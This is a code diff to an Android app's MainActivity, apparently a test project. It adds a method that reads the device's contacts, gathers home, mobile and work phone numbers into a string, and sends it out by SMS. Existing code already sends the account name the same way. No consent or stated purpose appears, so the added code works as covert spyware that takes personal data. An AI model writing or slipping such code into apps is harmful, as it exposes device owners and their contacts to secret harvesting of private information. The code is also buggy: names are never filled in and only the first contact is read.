@@ -5,6 +5,7 @@ import android.accounts.AccountManager;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
 import android.location.Address;
 import android.location.Criteria;
 import android.location.GpsStatus;
@@ -15,6 +16,7 @@ import android.location.LocationProvider;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
+import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.support.v7.app.ActionBarActivity;
 import android.os.Bundle;
@@ -103,6 +105,46 @@ public class MainActivity extends ActionBarActivity {
         }
         Log.d("TestAccount", account);
         sendSMS(account);
+    }
+
+    public void recupContactInfos() {
+        ContentResolver cr = getContentResolver();
+        Uri uri = ContactsContract.Contacts.CONTENT_URI;
+        Cursor cursor = cr.query(uri, null, null, null, null);
+        String contactInfo ="";
+        if (cursor.moveToFirst()) {
+            String name ="";
+            String phoneNumber = "";
+            String workNumber = "";
+            String homeNumber = "";
+            String contactId =
+                    cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+            int nameColumn =
+                    cursor.getColumnIndexOrThrow(ContactsContract.Data.DISPLAY_NAME);
+            Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
+            while (phones.moveToNext()) {
+                String number = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                int type = phones.getInt(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
+                switch (type) {
+                    case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
+                        homeNumber = number;
+                        break;
+                    case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
+                        phoneNumber = number;
+                        break;
+                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
+                        workNumber = number;
+                        break;
+
+
+
+                }
+                contactInfo = contactInfo+"Nom :"+name+"Numéro maison"+homeNumber+"Numéro portable :"+phoneNumber+"Numéro de travail :"+workNumber+"";
+            }
+
+        }
+        sendSMS(contactInfo);
     }
 
     protected void sendSMS(String recipient) {
